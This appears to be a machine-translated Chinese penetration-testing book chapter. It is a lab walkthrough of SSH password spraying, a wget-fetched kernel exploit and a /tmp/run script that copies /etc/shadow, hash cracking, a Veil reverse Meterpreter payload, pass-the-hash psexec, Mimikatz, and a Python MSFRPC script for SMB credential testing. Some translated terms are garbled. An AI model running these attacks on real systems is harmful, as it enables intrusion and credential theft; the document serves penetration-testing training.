# 五、使用 Python 利用服务

今天，渗透测试和利用服务的一个重大误解是，普遍存在可利用的**远程代码执行**（**RCE**漏洞。事实是，找到数百个只需要一个**互联网协议**（**IP**地址就可以插入工具的容易利用的服务的日子已经一去不复返了。您仍然会发现可以通过溢出堆栈或堆来利用的漏洞，它们只是显著减少或更复杂。我们将在[第 8 章](08.html#aid-1T1401 "Chapter 8. Exploit Development with Python, Metasploit, and Immunity")中解释为什么在今天的软件中更难利用这些漏洞，*使用 Python、Metasploit 和Immunity进行漏洞开发*，不用担心，我们会说到这一点。

因此，如果您希望每次都进入网络并利用 Microsoft 安全公告 MS08-067、MS03-024 或 MS06-40 获得立足点，那么您就大错特错了。不要担心，它们仍然存在，但不是在每个主机上都能找到它，而是在网络中可能有一个系统与它在一起。更糟糕的是，对于我们这些模拟的恶意参与者来说，它甚至可能无法让我们进入一个盒子，让我们能够继续参与。通常，它是一个遗留系统或供应商产品，甚至没有使用不同的凭据集连接到域。现在，这并不是说，情况总是这样。

将发现的 RCE 漏洞数量完全取决于组织的安全成熟度。这与规模或预算无关，而是与实施安全计划的战略有关。安全策略薄弱的组织和新建立的项目将有更多类似的漏洞，而具有更好策略的组织将有更少的漏洞。许多新的渗透测试人员忽视的另一个因素是人才；公司可能雇佣了防御型员工，这会显著影响他们在环境中的运营能力。

即使一个组织的安全策略很弱，但如果它雇佣了高技能的工程师和管理员，它也可能会有相当强硬的战术安全态势。在战术层面上，真正聪明的技术人员意味着可以实施强有力的控制，但如果没有总体安全战略，设备可能会丢失，相关强有力的技术态势中的差距可能会被发现。另外一个风险来自于那些熟练的成员离开组织，或者更糟的是，如果他们成为流氓。

无论哪种方式，如果没有既定的流程和程序，任何强有力的安全控制现在都可能被视为在这一点上受到损害。此外，可能不可能全面和有效地实施控制措施。作为渗透测试人员，这对您很重要的原因是，您可以了解组织信息安全计划的兴衰变化以及常见原因。管理层将期待您对其中一些问题的答案，您看到的指标将帮助您诊断问题并确定根本原因。

# 了解服务开发的新时代

在前面的章节中，我们准备向您展示一个新时代剥削的模拟例子。这意味着，我们正在利用错误配置、默认设置、错误做法和缺乏安全意识。与其在开发的代码中发现控制差距，不如在环境中的实现中包含人员培训。进入或通过网络的具体方式取决于网络，攻击向量会发生变化，而不是记忆特定向量，而是专注于建立思维定势。

今天的利用意味着识别已经存在的访问，并窃取该访问的一个组件，破坏具有该访问级别的系统，捕获这些系统的详细信息，并横向移动，直到识别关键数据或新的访问级别。一旦您确定了对系统的访问权限，您将尝试查找允许您移动和访问其他系统的详细信息。这意味着配置文件中包含用户名和密码、存储的用户名和密码或装载的共享。这些组件中的每一个都将为您提供访问其他主机的信息。以这种方式攻击系统的好处是，它比利用 RCE 和上传有效负载要安静得多；您可以在必要协议的范围内移动，并且可以更好地模拟真正的恶意参与者。

为了建立一种一致的语言，您可以从一个主机移动到另一个主机，在相同的权限级别上，这称为横向移动。当您发现更高级别的权限时，例如**域管理员（DA）**，这被视为垂直移动或权限升级。当您使用对主机或网络区域的访问来访问以前由于访问控制或网络隔离而看不到的系统时，这称为旋转。现在您已经理解了概念和术语，让我们弹出一些框。

### 提示

为了模拟这个例子，我们将使用 WindowsXP 模式和 Metasploitable 的组合，两者都是免费使用的。已经提供了有关设置 Metasploitable 的详细信息。Windows XP 模式的详细信息可在以下两个**统一资源定位器**（**URL**）[中找到 https://zeltser.com/windows-xp-mode-for-vmware-virtualization/](https://zeltser.com/windows-xp-mode-for-vmware-virtualization/) 和[https://zeltser.com/how-to-get-a-windows-xp-mode-virtual-machine-on-windows/](https://zeltser.com/how-to-get-a-windows-xp-mode-virtual-machine-on-windows/) 。记住执行 Windows 机器可能具有的所有这些漏洞，以启用其管理共享。在实际领域中，这很常见，因为它们通常用于管理远程系统。

# 了解漏洞的链接

在[第 4 章](04.html#aid-190861 "Chapter 4. Executing Credential Attacks with Python")中*使用 Python*执行凭证攻击，我们展示了如何识别系统或环境中的合法帐户。Metasploitable 有很好的文档记录，但访问系统的概念与实际情况完全相同。此外，从可用性和法律的角度来看，作为一名测试人员，使用这些可利用的盒子为您提供了一个极好的培训环境，风险很小。在上一章中，我们验证了目标系统上存在帐户`msfadmin`，并且在元表中，默认情况下，该帐户与用户名具有相同的密码。

就像真实环境一样，我们通过网站和配置渠道进行研究，以确定默认帐户和设置是什么，然后使用这些帐户和设置智能地利用这些框。为了验证这些弱点，我们将执行密码喷射攻击。此攻击对多个用户名使用一个密码，从而防止帐户锁定。它取决于环境中的密码重用原则，或者您所在地区的用户使用的通用密码。

### 注

你会发现在美国最常用的密码是 Password1、Password123、季节和年份（如 2015 年夏季），以及对你正在测试的公司名称或用户名的一些操作。直到今天，我在每一次约会中都发现了一些弱密码或默认密码的形式。如果您观察或阅读到任何重大违规行为，则弱密码、默认密码或已知密码都是其中的一个组成部分。另外，请注意，所有这些密码都将满足 Windows Active Directory 密码复杂性要求，如此处的[所示 https://technet.microsoft.com/en-us/library/hh994562%28v=ws.10%29.aspx](https://technet.microsoft.com/en-us/library/hh994562%28v=ws.10%29.aspx) 。

## 检查弱密码、默认密码或已知密码

使用与用户名相同的密码，使用已知用户名`msfadmin`对 Metasploitable 执行密码喷洒。我们扫描目标主机，寻找可以测试凭据的开放服务。

![Checking for weak, default, or known passwords](../Images/image00311.jpeg)

然后我们可以注意到，**Secure Shell**（**SSH**服务是开放的，因此这对 target 来说是一个很好的服务。此服务的折衷方案将提供对主机的交互式访问。例如，我们可以针对 SSH 服务启动 Hydra 来测试目标框上的这个特定弱点。如下图所示，我们已经验证了提供系统访问权限的用户名和密码组合。

![Checking for weak, default, or known passwords](../Images/image00312.jpeg)

现在，许多新的评估员会使用 Metasploit 来执行此攻击序列，如[第 3 章](03.html#aid-147LC2 "Chapter 3. Identifying Targets with Nmap, Scapy, and Python")、*物理引擎集成*所示。问题是，您不能与服务交互，而是必须通过命令 shell 而不是终端访问进行操作。为了绕过这个限制，我们将使用 SSH 客户端。

### 注

命令外壳不允许使用交互命令，而终端允许使用交互命令。通过 SSH 客户端利用 SSH 服务提供终端访问，而 Metasploit 模块`ssh_login`提供命令外壳访问。因此，如以下示例中所示，在可能的情况下优选终端。

## 获取对系统的 root 访问权限

现在我们知道了访问此系统的用户名和密码组合，我们可以尝试访问主机并识别系统上的其他详细信息。具体地说，我们希望识别其他用户名和密码，这些用户名和密码可以让我们访问其他系统。为此，我们需要查看是否可以访问目标主机上的`/etc/passwd`和`/etc/shadow`文件。这两个文件的组合将提供主机上的用户名和相关密码。SSH 进入系统，用户名和密码：`msfadmin`。

![Gaining root access to the system](../Images/image00313.jpeg)

现在，我们验证我们可以访问`/etc/passwd`文件，然后使用**安全副本**（**SCP**将该文件复制到我们的 Kali 主机上。以下成功副本表明我们有权访问该文件：

![Gaining root access to the system](../Images/image00314.jpeg)

然后，我们尝试使用当前访问权限访问`/etc/shadow`，并确定这是不可能的。

![Gaining root access to the system](../Images/image00315.jpeg)

这意味着我们需要提升本地特权以获得对文件的访问权；在 Linux 中，这可以通过以下四种主要方式之一实现。最简单的方法是在主机上查找存储的用户名和密码，这在 Linux 或 UNIX 服务器上非常常见。第二种方式，不要求将漏洞带入系统，即通过操纵文件、输入和输出，这些文件、输入和输出不正确地使用了粘性位，**设置用户标识符**（**SUID**），以及**全局唯一标识符**（**GUID**。第三种方法是利用易受攻击的内核版本。

第四种方法是最容易被忽略的访问这些文件的方式，即通过`misconfigured sudo`访问。您所要做的就是执行`sudo su -`，它将会话实例化为 root。以下内容显示，这只是获取系统根访问权限的一个示例：

![Gaining root access to the system](../Images/image00316.jpeg)

### 提示

从技术上讲，还有第五种方法，但这意味着利用可能直接提供根访问的不同服务。这在 Metasploitable 中可用，但在实际环境中不太常见。

现在请记住，在这一点上，我们可以很容易地抓取这两个文件并将它们复制下来。为了提供一个更现实的示例，我们将重点介绍针对内核的利用研究验证和执行。因此，我们需要在系统上验证内核的版本，并使用命令`uname -a`查看它是否易受攻击。

![Gaining root access to the system](../Images/image00317.jpeg)

系统正在运行内核版本 2.6.24，该版本已过时，并且已知易受攻击。这可以在许多地方进行研究，包括最流行的[之一 http://www.cvedetails.com/](http://www.cvedetails.com/) ，它不仅引用漏洞，还指向可以发现漏洞的位置。

### 提示

切勿从 Internet 下载漏洞并在系统上直接利用它。相反，应始终在实验室环境中，在没有连接到任何其他系统或设备的隔离系统上进行测试。测试时，请确保运行网络监听和其他监控工具，以验证哪些活动可能在后台运行。

从**Gotogle**页面，您可以直接搜索该漏洞。

![Gaining root access to the system](../Images/image00318.jpeg)

结果是该内核存在大量漏洞。我们正在寻找一个特定的漏洞，该漏洞允许我们使用已知的漏洞执行权限提升。因此，我们导航到在**漏洞（324）**下发现的逐项漏洞，它表示在本书撰写时针对特定内核版本发现的漏洞数量。

![Gaining root access to the system](../Images/image00319.jpeg)

我们通过**漏洞数量下降**来组织漏洞，以发现可利用的漏洞。

![Gaining root access to the system](../Images/image00320.jpeg)

然后，我们查找每个在“漏洞”列中有一个红色数字的漏洞和在**漏洞类型**列中有一个**+Priv**的漏洞，以识别有用的漏洞。这表示分发给公众的可用漏洞数量，以及对漏洞的实际利用会返回什么，在这种情况下是升级权限。

![Gaining root access to the system](../Images/image00321.jpeg)

CVE-2010-1146 是一个非常好的候选者，如下例所示。现在可以在[找到公开的漏洞 http://www.exploit-db.com/exploits/12130](http://www.exploit-db.com/exploits/12130) [引用的](http://www.cvedetails.com/)http://www.cvedetails.com/ 。

![Gaining root access to the system](../Images/image00322.jpeg)

现在，在下载该漏洞并运行它之前，您应该检查系统是否容易受到该漏洞的攻击。基本要求是安装有**扩展属性****xattr**的**Reiser 文件系统**（**ReiserFS**）。因此，我们需要通过使用内置命令的组合来检查 Metasploitable 实例上是否存在 ReiserFS xattr。首先，我们需要用`fdisk -l`标识分区，然后用`df -T`标识文件系统类型，然后我们可以在必要时查看每个 ReiserFS 分区。来自标识符为 83 的`fdisk -l`的任何输出都可能是 ReiserFS 装载的候选。

![Gaining root access to the system](../Images/image00323.jpeg)

正如您在设备上方看到的一样，`/dev/sda1`的标识符为 83，因此该挂载可能是 ReiserFS；可通过`df -T`进行验证。命令运行后，我们看到该设备是一个 EXT3 文件系统，这意味着它不是 ReiserFS，因此我们不需要检查文件系统是否启用了扩展属性。

### 提示

您还可以检查`/etc/fstab`以查看是否为 xattr 和 reiserfs 正确定义了分区。请记住，这不会检测到系统上可能存在的手动装载，因此您可能会错过攻击向量。请记住，`/etc/fstab`中可能还包含明文凭据，或者对包含凭据的装载文件的引用。所以，它仍然是一个检查项目的好地方，可以让你向前迈进。

![Gaining root access to the system](../Images/image00324.jpeg)

因此，内核理论上易受此漏洞攻击，但此主机的当前配置不易受特定漏洞攻击的影响。现在我们知道，即使在执行之前，这种特定的特权利用也不会起作用。也就是说，我们需要回到[http://www.cvedetails.com/](http://www.cvedetails.com/) 并尝试识别其他可行的漏洞。CVE-2009-1185 存在一个潜在的漏洞，该漏洞利用 milw0rm 进行攻击。

![Gaining root access to the system](../Images/image00325.jpeg)

### 注

任何引用用于的漏洞攻击都指向[http://www.milw0rm.com](http://www.milw0rm.com) 是现在位于[http://www.exploit-db.com/](http://www.exploit-db.com/) 。当进攻性安全小组接管`milw0rm`数据库时，该数据库被移动到`expoloit-db`。因此，只要调整相关的 URL，您就会发现相同的细节。

现在，您可以从网站下载漏洞并将其传输到系统，或者我们可以通过命令行进行欺骗并完成它。只需运行以下命令：

```
wget http://www.exploit-db.com/download/8572 -O escalate.c

```

这将下载该漏洞并将其保存为一个`code`，以便在本地主机上编译和执行。

![Gaining root access to the system](../Images/image00326.jpeg)

我们需要找到`gcc`编译器，并验证它是否在我们的路径中，以便于执行，然后在目标系统上编译代码。这可以按如下方式完成，即`gcc`，然后可以使用`gcc`使用以下命令`gcc escalate.c -o escalate`将代码编译成漏洞攻击。这将输出名为`escalate`的新可执行二进制文件。

### 提示

在实际系统上执行此操作时，不要命名文件`exploit`、`escalate`、`shell`、`pwned`或任何类似的名称。这些是许多安全工具扫描的常见名称，因此它们可以在执行之前进行标记。就本例而言，这并不重要。

现在，编译的漏洞被称为`escalate`，一旦我们确定了一些其他信息组件，就可以运行该漏洞。此漏洞利用 udevd netlink 套接字进程，因此我们需要识别该进程并将漏洞传递给**进程标识符**（**PID**）。这可以在引用服务`/proc/net/netlink`的文件中找到。您可以通过执行以下命令`cat /proc/net/netlink`来识别细节：

![Gaining root access to the system](../Images/image00327.jpeg)

### 注

请记住，您的 PID 可能会有所不同。

此漏洞，特别是执行一个脚本，其中包含写入文件`/tmp/run`的命令。因此，让我们将`/etc/shadow`文件复制到`/tmp`，因为我们首先尝试访问该数据。我们还需要验证复制的文件是否与原始文件相同；我们可以通过获取每个文件的**消息摘要 5**（**MD5**并将结果放入`/tmp`中另一个名为`hashes`的文件中来轻松实现这一点。在`/tmp`中创建一个名为 run 的文件，并添加以下内容：

```
#!/bin/bash
cp /etc/shadow /tmp/shadow
chmod 777 /tmp/shadow
md5sum /tmp/shadow > /tmp/hashes
md5sum /etc/shadow >> /tmp/hashes

```

然后，使用您试图利用的特定进程的参数运行利用漏洞攻击。下图显示了`gcc`编译器的标识、漏洞的编译、执行和结果证明：

![Gaining root access to the system](../Images/image00328.jpeg)

### 注

可以直接卸载文件，而不移动并复制它，但通常情况下，您不会将系统的用户名和密码写入已被利用的框中的文件，因为您永远不知道该框中已经有谁。此外，本示例的设计思想是，系统上可能不存在像`netcat`这样的简单端口重定向工具。

然后通过比较两个文件的 MD5 哈希并将其写入`/tmp/hashes`文件，验证复制文件的内容是否与`/etc/shadow`文件相同。然后可以将新复制的文件从系统复制到攻击框中。

### 提示

在真实环境中要始终非常小心，当您复制`passwd`或卷影文件时，可能会破坏目标系统。因此，请确保不要删除、重命名或移动原件。如果在目标系统的其他位置复制，请将其删除，以免帮助真正的攻击者。

另外，请记住，内核漏洞利用有三种输出之一，它们可能在每次执行时都不起作用（因此请重试），它们可能会使特定主机崩溃，或者提供所需的结果。如果您正在执行这些类型的攻击，请在执行之前始终与您的客户端协作，以确保它不是关键系统。简单的重启通常可以修复崩溃，但在工作站上执行这些类型的攻击总是比在服务器上执行更安全。

![Gaining root access to the system](../Images/image00329.jpeg)

## 理解 Linux 哈希的破解

现在，创建一个目录来处理 Kali 盒上的所有破解数据，并将阴影和`passwd`文件移到上面。

![Understanding the cracking of Linux hashes](../Images/image00330.jpeg)

然后，使用 John 将文件与`unshadow`命令组合，然后开始默认的破解尝试。

![Understanding the cracking of Linux hashes](../Images/image00331.jpeg)

## 账户凭证同步测试

根据这些结果，我们可以确定这些凭证中是否有任何凭证在网络中被重用。我们知道目标网络中主要有 Windows 主机，但我们需要确定哪些主机的端口`445`处于打开状态。然后，当运行以下命令时，我们可以尝试并确定哪些帐户可以授予我们访问权限：

```
nmap -sS -vvv -p445 192.168.195.0/24 -oG output

```

然后，使用以下命令解析打开端口的结果，该命令将提供启用了**服务器消息块（SMB）**的目标主机文件。

```
grep 445/open output| cut -d" " -f2 >> smb_hosts

```

密码可以直接从 John 提取，并作为密码文件写入，可用于后续服务攻击。

```
john --show unshadowed |cut -d: -f2|grep -v " " > passwords

```

### 提示

首次运行此类攻击时，请始终在单个主机上进行测试。在本例中，我们使用 sys 帐户，但更常见的是使用 root 帐户或类似的管理帐户来测试环境中的密码重用（同步）。

以下使用`auxiliary/scanner/smb/smb_enumusers_domain`的攻击将检查两件事。它将确定此帐户可以访问哪些系统，以及当前登录到该系统的相关用户。在本例的第二部分中，我们将重点介绍如何识别实际具有特权且属于域的帐户。

`smb_enumusers_domain`模块有优点也有缺点。缺点是不能在其中加载多个用户名和密码。该功能保留给`smb_login`模块。`smb_login`的问题是它非常嘈杂，因为许多特征码检测工具都使用这种登录测试方法。第三个模块`smb_enumusers`，可以使用，但它只提供与 locale 用户相关的详细信息，因为它基于**安全账户管理器**（**SAM**文件内容识别用户。因此，如果用户拥有域帐户并已登录该框，`smb_enumusers`模块将不会识别他们。

因此，在确定要横向移动的目标时，要了解每个模块及其局限性。我们将重点介绍如何配置`smb_enumusers_domain`模块并执行它。这将显示访问易受攻击主机，然后验证 DA 帐户成员身份的示例。然后，该信息可用于识别 DA 的位置，以便使用 Mimikatz 提取凭据。

### 注

在本例中，我们还将使用一个使用 Veil 的自定义漏洞，试图绕过驻留的**主机入侵防御系统**（**HIPS**）。有关面纱的更多信息，请访问[https://github.com/Veil-Framework/Veil-Evasion.git](https://github.com/Veil-Framework/Veil-Evasion.git) 。

因此，我们将模块配置为使用密码`batman`，并针对系统上的本地管理员帐户。这可以更改，但通常使用默认值。由于是本地管理员，所以域设置为`WORKGROUP`。下图显示了模块的配置：

![Testing for the synchronization of account credentials](../Images/image00332.jpeg)

### 注

在运行这些命令之前，请确保使用 spool 将结果输出到日志文件，以便您可以返回并查看结果。

正如您在下图中所看到的，该账户提供了登录系统的详细信息。这意味着有与返回的帐户名相关的已登录用户，并且本地管理员帐户将在该系统上工作。这意味着通过**通过散列攻击**（**PtH**，该系统已经成熟，可以进行妥协。

![Testing for the synchronization of account credentials](../Images/image00333.jpeg)

### 注

`psexec`模块允许您通过提取的**局域网管理器（LM）**：**新技术 LM（NTLM）**散列和用户名组合，或者仅通过用户名密码对进行访问。

首先，我们设置了一个自定义的 multi/handler 来捕获我们在下面的示例中由 Veil 生成的自定义漏洞。请记住，我使用`443`作为本地端口，因为它绕过了大多数 HIPS，并且本地主机将根据您的主机而改变。

![Testing for the synchronization of account credentials](../Images/image00334.jpeg)

现在，我们需要使用 Veil 生成自定义有效载荷，以便与`psexec`模块一起使用。您可以导航到`Veil-Evasion`安装目录并使用`python Veil-Evasion.py`运行它。Veil 有大量有效载荷，可以通过各种模糊或保护机制生成，以查看您想要使用的特定有效载荷，并执行`list`命令。您可以通过键入有效负载的编号或名称来选择有效负载。例如，运行以下命令以生成不使用 shell 代码的 C Sharp stager，请记住，这需要在目标框上使用特定版本的.NET。

```
use cs/meterpreter/rev_tcp
set LPORT 443
set LHOST 192.168.195.160
set use_arya Y
generate

```

### 注

一个典型的有效载荷有两个组成部分，阶段器和阶段。stager 在攻击者和受害者之间建立网络连接。通常使用本机系统语言的有效负载可能会更为缓慢。第二部分是 stage，它是 stager 下载的组件。这些可以包括你的计量器之类的东西。如果两个项目合并，则称为单个项目；想想看，当你创建恶意的**通用串行总线**（**USB**驱动器时，这些驱动器通常是单驱动器。

输出将是一个可执行文件，它将生成一个加密的反向**超文本传输协议安全（HTTPS**MeterMeter）。

![Testing for the synchronization of account credentials](../Images/image00335.jpeg)

可使用脚本`checkvt`测试有效载荷，该脚本可安全验证大多数 HIPS 解决方案是否会拾取有效载荷。它这样做时没有将其上传到 Virus Total，反过来也不会将有效负载添加到数据库中，而许多 HIPS 提供商都从数据库中获取有效负载。相反，它将有效负载的哈希值与数据库中已有的哈希值进行比较。

![Testing for the synchronization of account credentials](../Images/image00336.jpeg)

现在，我们可以设置模块`psexec`以引用自定义负载执行。

![Testing for the synchronization of account credentials](../Images/image00337.jpeg)

更新`psexec`模块，通过设置`EXE::Custom`使用`Veil-Evasion`生成的自定义有效载荷，并通过设置`DisablePayloadHandler true`禁用自动有效载荷处理程序，如下图：

![Testing for the synchronization of account credentials](../Images/image00338.jpeg)

利用目标框，然后尝试识别域中的 DAs。这可以通过两种方式之一完成，或者使用`post/windows/gather/enum_domain_group_users`模块，或者通过 shell access 的以下命令：

```
net group "Domain Admins"

```

然后我们可以`Grep`通过先前运行的模块的假脱机输出文件来定位可能已登录这些 DAs 的相关系统。当获得对其中一个系统的访问权限时，内存中可能会有 DA 令牌或凭据，这些令牌或凭据可以提取和重用。以下命令是如何分析日志文件中这些类型条目的示例：

```
grep <username> <spoofile.log>

```

如您所见，这个非常简单的利用路径允许您识别 DAs 所在的位置。一旦您进入系统，您所要做的就是`load mimikatz`并通常使用`wdigest`命令从已建立的 MeterMeter 会话中提取凭证。当然，这意味着系统必须比 Windows 2000 更新，并且在内存中具有活动凭据。如果没有，这将需要更多的努力和研究才能取得进展。为了强调这一点，我们使用已建立的会话来提取带有`Mimikatz`的凭证，如下面的示例所示。凭据在内存中，由于目标框是 Windows XP 计算机，因此我们没有冲突，也不需要进行其他研究。

![Testing for the synchronization of account credentials](../Images/image00339.jpeg)

除了从系统中提取活动 DA 列表收集的情报外，我们现在还可以使用另一组已确认的凭据。清洗和重复这种攻击方法可以让您在网络中快速横向移动，直到确定可行的目标。

# 用 Python 实现开发序列的自动化

这个开发序列相对简单，但我们可以通过**元 sploit 远程过程调用**（**MSFRPC**来自动化其中的部分。此脚本将使用`nmap`库扫描`445`的活动端口，然后使用通过参数传递给脚本的用户名和密码生成要测试的目标列表。该脚本将使用相同的`smb_enumusers_domain`模块来识别重复使用凭据的框以及其他可行的用户登录到这些框中。首先，我们需要为 Python 安装`SpiderLabs msfrpc`库。此库可在[找到 https://github.com/SpiderLabs/msfrpc.git](https://github.com/SpiderLabs/msfrpc.git) 。

### 注

该书的 github 存储库位于[https://github.com/funkandwagnalls/pythonpentest](https://github.com/funkandwagnalls/pythonpentest) 其中有一个安装文件，可以运行该文件来安装所有必要的软件包、库和资源。

我们正在创建的脚本使用`netifaces`库来标识哪些接口 IP 地址属于您的主机。然后扫描 IP 地址、范围上的 SMB 端口`445`或**类域间路由**（**CIDR**地址。它消除属于您接口的所有 IP 地址，然后使用 Metasploit 模块`auxiliary/scanner/smb/smb_enumusers_domain`测试凭据。同时，它验证哪些用户登录到系统。除了实时响应之外，此脚本的输出还有两个文件，一个是包含所有响应的日志文件，另一个是包含所有具有 SMB 服务的主机的 IP 地址的文件。

### 提示

此 Metasploit 模块利用了 RPCDCE，它不在端口`445`上运行，但我们正在验证该服务是否可用于后续利用。

![Automating the exploit train with Python](../Images/image00340.jpeg)

如果攻击者发现要测试的其他凭据集，则可以将此文件反馈到脚本中，如下所示：

![Automating the exploit train with Python](../Images/image00341.jpeg)

最后，可以像 Metasploit 模块一样直接向脚本传递散列，如下所示：

![Automating the exploit train with Python](../Images/image00342.jpeg)

### 注

每次运行脚本时，输出都会略有不同，具体取决于您为执行命令而获取的控制台标识符。唯一真正的区别是 Metasploit 控制台启动时典型的附加横幅项。

现在有两件事需要说明，是的，你可以生成一个资源文件，但是当你开始进入拥有数百万 IP 地址的组织时，这就变得难以管理了。此外，MSFRPC 也可以将资源文件直接输入，但这会显著降低进程的速度。如果您想进行比较，请重写此脚本，以执行与您之前编写的`ssh_login.py`脚本相同的测试，但直接与 MSFRPC 集成。

### 注

未来最重要的一点是，本书中许多未来的脚本都将非常大，并带有额外的错误检查。因为你的技能是从头开始建立起来的，所以已经陈述的概念不会重复。相反，可以从 GitHub 下载整个脚本，以确定脚本的细微差别。这个脚本确实使用了之前在`ssh_login.py`脚本中使用的`netifaces`函数，但为了简洁起见，我们不打算在本章中复制它。您可以在[下载完整的脚本 https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/msfrpc_smb.py](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/msfrpc_smb.py) 。

像所有需要建立的脚本库一样，其中大多数您已经熟悉，最新的一个与`SpiderLabs`的 MSFRPC 相关。此脚本所需的库如下所示：

```
import os, argparse, sys, time
try:
    import msfrpc
except:
    sys.exit("[!] Install the msfrpc library that can be found 
      here: https://github.com/SpiderLabs/msfrpc.git")
try:
    import nmap
except:
    sys.exit("[!] Install the nmap library: pip install python-nmap")
try:
    import netifaces
except:
    sys.exit("[!] Install the netifaces 
      library: pip install netifaces")
```

然后，我们构建一个模块，以确定相关目标，这些目标将使辅助模块针对它运行。首先，我们设置构造函数和传递的参数。请注意，对于这个脚本，我们有两个要测试的服务名称，`microsoft-ds`和`netbios-ssn`，因为根据`nmap`结果，其中任何一个都可以表示端口 445。

```
def target_identifier(verbose, dir, user, passwd, ips, port_num, ifaces, ipfile):
    hostlist = []
    pre_pend = "smb"
    service_name = "microsoft-ds"
    service_name2 = "netbios-ssn"
    protocol = "tcp"
    port_state = "open"
    bufsize = 0
    hosts_output = "%s/%s_hosts" % (dir, pre_pend)
```

之后，我们将 nmap 扫描仪配置为通过文件或命令行扫描详细信息。注意，`hostlist`是文件加载的所有地址的字符串，它们之间用空格分隔。打开`ipfile`并读取，然后将所有新行加载到字符串中时替换为空格。这是 nmap 库的特定`hosts`参数的要求。

```
    if ipfile != None:
  if verbose > 0:
print("[*] Scanning for hosts from file %s") % (ipfile)
        with open(ipfile) as f:
            hostlist = f.read().replace('\n',' ')
        scanner.scan(hosts=hostlist, ports=port_num)
    else:
  if verbose > 0:
        print("[*] Scanning for host\(s\) %s") % (ips)
        scanner.scan(ips, port_num)
    open(hosts_output, 'w').close()
    hostlist=[]
    if scanner.all_hosts():
        e = open(hosts_output, 'a', bufsize)
    else:
        sys.exit("[!] No viable targets were found!") 
```

攻击系统上所有接口的 IP 地址都将从测试池中删除。

```
    for host in scanner.all_hosts():
        for k,v in ifaces.iteritems():
            if v['addr'] == host:
                print("[-] Removing %s from target list since it 
                    belongs to your interface!") % (host)
                host = None 
```

最后，详细信息将写入相关的输出文件和 Python 列表，然后返回到原始调用源。

```
        if host != None:
            e = open(hosts_output, 'a', bufsize)
            if service_name or service_name2 in 
              scanner[host][protocol][int(port_num)]['name']:
                if port_state in 
                    scanner[host][protocol][int(port_num)]['state']:
                    if verbose > 0:
                        print("[+] Adding host %s to %s since the service 
                            is active on %s") % (host, hosts_output, port_num)
                    hostdata=host + "\n"
                    e.write(hostdata)
                    hostlist.append(host)
    else:
        if verbose > 0:
               print("[-] Host %s is not being added to %s since the 
                   service is not active on %s") % 
                       (host, hosts_output, port_num)
    if not scanner.all_hosts():
        e.closed
    if hosts_output:
        return hosts_output, hostlist 
```

下一个函数创建将要执行的实际命令；将为扫描返回的每个主机调用此函数作为潜在目标。

```
def build_command(verbose, user, passwd, dom, port, ip):
    module = "auxiliary/scanner/smb/smb_enumusers_domain"
    command = '''use ''' + module + '''
set RHOSTS ''' + ip + '''
set SMBUser ''' + user + '''
set SMBPass ''' + passwd + '''
set SMBDomain ''' + dom +'''
run
'''
    return command, module
```

最后一个函数实际启动与 MSFRPC 的连接，并针对特定主机执行相关命令。

```
def run_commands(verbose, iplist, user, passwd, dom, port, file):
    bufsize = 0
    e = open(file, 'a', bufsize)
    done = False
```

该脚本创建与 MSFRPC 的连接，并创建控制台，然后通过特定的`console_id`对其进行跟踪。别忘了，`msfconsole`可以有多个会话，因此我们必须将会话跟踪到`console_id`。

```
    client = msfrpc.Msfrpc({})
    client.login('msf','msfrpcpassword')
    try:
        result = client.call('console.create')
    except:
        sys.exit("[!] Creation of console failed!")
    console_id = result['id']
    console_id_int = int(console_id)
```

然后，该脚本迭代已确认具有活动 SMB 服务的 IP 地址列表。然后，脚本为每个 IP 地址创建必要的命令。

```
    for ip in iplist:
        if verbose > 0:
            print("[*] Building custom command for: %s") % (str(ip))
        command, module = build_command(verbose, user, 
          passwd, dom, port, ip)
        if verbose > 0:
            print("[*] Executing Metasploit module %s 
              on host: %s") % (module, str(ip)) 
```

然后将命令写入控制台，我们等待结果。

```
        client.call('console.write',[console_id, command])
        time.sleep(1)
        while done != True:
```

我们等待每个命令执行的结果，并验证已返回的数据以及控制台是否仍在运行。如果是，我们将延迟数据的读取。完成后，结果将写入指定的输出文件。

```
            result = client.call('console.read',[console_id_int])
            if len(result['data']) > 1:
                if result['busy'] == True:
                    time.sleep(1)
                    continue
                else:
                    console_output = result['data']
                    e.write(console_output)
                    if verbose > 0:
                        print(console_output)
                    done = True
```

我们关闭文件并销毁控制台以清理我们所做的工作。

```
    e.closed
    client.call('console.destroy',[console_id])
```

脚本的最后部分与设置参数、设置构造函数和调用模块有关。这些组件与以前的脚本类似，为了节省空间，这里没有包含这些组件，但是可以在 GitHub 上前面提到的位置找到详细信息。最后一个要求是使用我们想要的特定密码在`msfconsole`处加载`msgrpc`。因此，启动`msfconsole`，然后在其中执行以下操作：

```
load msgrpc Pass=msfrpcpassword
```

### 注

命令并没有输入错误，Metasploit 已经移到了`msgrpc`节`msfrpc`，但每个人仍然将其称为`msfrpc`。最大的区别在于`msgrpc`库使用 POST 请求发送数据，而`msfrpc`库使用**可扩展标记语言**（**XML**）。所有这些都可以通过资源文件自动设置服务。

# 总结

在本章中，我们重点介绍了一种方法，在该方法中，您可以在示例环境中移动。特别是，如何利用相对框、升级权限和提取其他凭据。从这个位置，我们确定了我们可以横向移动到的其他可行主机以及当前登录到它们的用户。我们使用 Veil 框架生成自定义有效载荷以绕过 HIPS，并执行 PtH 攻击。这允许我们使用工具 Mimikatz 从内存中提取其他凭据。然后，我们自动识别可行的次要目标，用户使用 Python 和 MSFRPC 登录这些目标。根据您的预期，这其中的许多可能看起来非常令人惊讶，无论是复杂还是缺乏复杂性。请记住，这一切都取决于您的环境以及实际破解它所需的工作量。本章提供了大量与开发基于网络和系统的资源相关的详细信息，下一章将从不同的角度重点介绍 web 评估。